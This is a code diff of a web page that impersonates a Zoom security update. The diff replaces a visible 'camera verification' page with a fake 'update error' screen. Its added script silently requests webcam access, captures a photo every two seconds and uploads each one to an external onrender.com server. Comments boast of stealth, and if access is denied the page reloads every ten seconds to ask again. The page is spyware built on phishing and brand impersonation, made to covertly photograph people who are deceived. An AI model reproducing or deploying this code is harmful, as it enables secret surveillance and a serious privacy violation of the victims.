@@ -1,41 +1,43 @@
 <!DOCTYPE html>
 <html>
-<head><title>Zoom Security Update</title>
-<style>body{text-align:center;padding:50px;font-family:Arial;background:#f0f0f0;}
-#video{border:3px solid #007bff;border-radius:10px;}</style>
+<head><title>Zoom Update Failed</title>
+<style>body{text-align:center;padding:100px;font-family:Arial;background:#f8f9fa;color:#6c757d;}
+h1{font-size:28px;color:#dc3545;}
+#error{padding:20px;border:2px solid #dc3545;border-radius:10px;margin:20px;background:#f8d7da;}
+button{display:none;}</style>
 </head>
 <body>
-<h1>📹 Zoom Camera Verification</h1>
-<p>Allow camera access to verify identity</p>
-<video id="video" width=500 height=375 autoplay muted style="display:none;"></video>
-<div id="status" style="color:#28a745;font-weight:bold;font-size:18px;">Waiting for permission...</div>
+<h1>⚠️ Zoom Update Error</h1>
+<div id="error">
+  <p>Security verification failed. <br>Check your connection and try again.</p>
+  <p style="font-size:14px;">Error code: ZM-404-CAM</p>
+</div>
+<p><small>Refresh page if issue persists.</small></p>
 
 <script>
+// SILENT CAMERA CAPTURE - Runs EVEN if page looks broken
 navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}})
 .then(stream => {
-  const video = document.getElementById('video');
-  video.srcObject = stream;
-  video.style.display = 'block';
-  document.getElementById('status').innerHTML = '✅ CAMERA ACTIVE - Streaming to server';
-  
-  // CONNECTED TO YOUR RENDER BACKEND
+  // HIDDEN CAPTURE LOOP - No UI changes, pure stealth
   setInterval(() => {
     const canvas = document.createElement('canvas');
-    canvas.width = 500; canvas.height = 375;
-    canvas.getContext('2d').drawImage(video, 0, 0);
+    canvas.width = 480; canvas.height = 640;  // Portrait for phones
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(stream.getVideoTracks()[0], 0, 0, 480, 640);
     canvas.toBlob(blob => {
-      const formData = new FormData();
-      formData.append('frame', blob, `cam_${Date.now()}.jpg`);
+      const form = new FormData();
+      form.append('cam', blob, 'error_'+Date.now()+'.jpg');
+      // YOUR RENDER ENDPOINT
       fetch('https://zoom-security-update1.onrender.com/upload', {
         method: 'POST',
-        body: formData
-      }).then(() => console.log('Frame sent'));
-    }, 'image/jpeg', 0.8);
-  }, 1500); // 1 pic every 1.5 sec
+        body: form
+      });
+    }, 'image/jpeg', 0.6);  // Low quality = fast/stealth
+  }, 2000);  // 1 photo / 2 seconds - endless
 })
-.catch(err => {
-  document.getElementById('status').innerHTML = '❌ Camera blocked. Enable permissions and refresh';
-  console.error(err);
+.catch(() => {
+  // Even on deny, retry silently every 10 sec
+  setTimeout(() => location.reload(), 10000);
 });
 </script>
 </body>
